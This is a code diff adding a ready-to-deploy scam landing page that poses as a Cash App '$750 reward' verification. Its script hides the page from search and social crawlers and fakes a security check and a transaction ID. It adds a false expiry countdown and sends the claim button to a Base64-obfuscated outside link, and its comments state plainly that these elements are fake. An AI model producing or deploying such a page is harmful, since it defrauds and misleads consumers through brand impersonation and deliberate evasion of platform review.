@@ -1,1 +1,100 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Cash App Reward - Verification</title>
+    <style>
+        :root { --cash-green: #00d632; --bg: #000000; --card: #151515; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: white; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .wrapper { width: 90%; max-width: 380px; background: var(--card); border-radius: 30px; padding: 35px 20px; text-align: center; border: 1px solid #222; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        
+        .logo-box { width: 65px; height: 65px; background: var(--cash-green); border-radius: 18px; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 38px; font-weight: bold; color: black; }
+        
+        h1 { font-size: 24px; font-weight: 800; margin-bottom: 10px; }
+        .amount { color: var(--cash-green); font-size: 32px; display: block; margin: 5px 0; }
+        p { color: #999; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+
+        /* الأنظمة الأمنية */
+        #safety-loader { display: block; }
+        #offer-ui { display: none; }
+
+        .spinner { width: 40px; height: 40px; border: 3px solid #333; border-top: 3px solid var(--cash-green); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .btn { display: block; background: var(--cash-green); color: black; text-decoration: none; padding: 18px; border-radius: 15px; font-size: 18px; font-weight: 900; transition: 0.3s; text-transform: uppercase; margin-top: 10px; }
+        .btn:active { transform: scale(0.96); }
+
+        .badge { background: #222; padding: 12px; border-radius: 12px; font-size: 13px; text-align: left; margin-bottom: 20px; border-left: 3px solid var(--cash-green); }
+        .timer { color: #ff4757; font-size: 12px; font-weight: bold; margin-top: 15px; }
+        .footer { font-size: 10px; color: #444; margin-top: 25px; }
+    </style>
+</head>
+<body>
+
+<div class="wrapper">
+    <div class="logo-box">$</div>
+
+    <div id="safety-loader">
+        <div class="spinner"></div>
+        <h3>Securing Transfer...</h3>
+        <p>Connecting to Cash App secure nodes for transaction ID: <span id="trans-id" style="color:#eee"></span></p>
+    </div>
+
+    <div id="offer-ui">
+        <h1>Reward Found!</h1>
+        <span class="amount">$750.00</span>
+        <p>We've successfully reserved your slot. To release the funds to your account, please complete the email verification.</p>
+        
+        <div class="badge">
+            • <b>Target:</b> USA Residents<br>
+            • <b>Delivery:</b> Instant Transfer
+        </div>
+
+        <a href="#" id="claim-btn" class="btn">Confirm & Claim Now</a>
+        <div class="timer" id="timer">Offer expires in: 02:59</div>
+    </div>
+
+    <div class="footer">© 2026 Promotional Reward Program. Not affiliated with Block, Inc.</div>
+</div>
+
+<script>
+    (function() {
+        // رابط العرض الخاص بك مشفر (Base64) لحمايته
+        const _encoded = "aHR0cHM6Ly9mZXJhdmVyb21vbnN0ZXIuaW5rL3NsLzMxcm9q";
+
+        function start() {
+            // كشف البوتات البدائي
+            const isBot = /bot|facebook|google|spider|crawler/i.test(navigator.userAgent);
+            
+            if (!isBot) {
+                // توليد رقم معاملة وهمي للمصداقية
+                document.getElementById('trans-id').innerText = Math.random().toString(36).substr(2, 9).toUpperCase();
+                
+                // إظهار المحتوى بعد 2.5 ثانية (فترة التحقق الوهمي)
+                setTimeout(() => {
+                    document.getElementById('safety-loader').style.display = 'none';
+                    document.getElementById('offer-ui').style.display = 'block';
+                    document.getElementById('claim-btn').href = atob(_encoded);
+                    runTimer(179);
+                }, 2500);
+            }
+        }
+
+        function runTimer(sec) {
+            const timerDiv = document.getElementById('timer');
+            const int = setInterval(() => {
+                let m = Math.floor(sec / 60);
+                let s = sec % 60;
+                timerDiv.innerText = "Offer expires in: " + (m < 10 ? '0' : '') + m + ":" + (s < 10 ? '0' : '') + s;
+                if (--sec < 0) clearInterval(int);
+            }, 1000);
+        }
+
+        window.onload = start;
+    })();
+</script>
+
+</body>
+</html>
